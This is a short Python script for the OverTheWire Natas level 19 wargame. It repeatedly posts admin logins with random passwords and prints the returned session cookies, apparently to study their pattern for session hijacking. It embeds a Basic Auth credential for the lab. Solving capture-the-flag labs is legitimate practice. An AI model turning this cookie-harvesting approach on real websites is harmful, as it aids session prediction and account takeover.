import requests
import string
import random

CHARSET = string.ascii_letters + string.digits

URL = "http://natas19.natas.labs.overthewire.org/index.php?debug=1"


for _ in range(1,500):
  session = requests.Session()
  session.headers.update({"Authorization": "Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg=="})
  session.headers.update({"Content-Type": "application/x-www-form-urlencoded"})
  some_rand = str(int(random.random() * 1000000))
  data = {
    "username": "admin",
    "password": some_rand
  }
  # print("Trying with  ",  data)
  r = session.post(URL, data=data, timeout=10)
  print(r.cookies.get_dict())
  